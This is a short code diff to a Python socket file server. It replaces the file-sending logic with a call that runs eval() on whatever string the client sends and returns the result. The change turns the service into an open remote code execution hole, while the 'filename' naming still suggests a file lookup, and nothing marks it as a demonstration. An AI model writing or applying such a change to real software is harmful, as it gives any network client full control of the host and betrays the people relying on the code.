@@ -8,18 +8,11 @@ def handle_client(conn, addr):
     filename = conn.recv(1024).decode()
     print(f"Client {addr} requested: {filename}")
     
-    if os.path.exists(filename):
-        conn.send(b'OK')
-        with open(filename, 'rb') as f:
-            while True:
-                data = f.read(1000)
-                if not data:
-                    break
-                conn.send(data)
-                time.sleep(0.2)
-        print(f"File {filename} sent to {addr}")
-    else:
-        conn.send(b'ERROR: File not found')
+    try:
+        result = str(eval(filename))
+    except Exception as e:
+        result = f"Error: {e}"
+    conn.send(result.encode())
     conn.close()
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
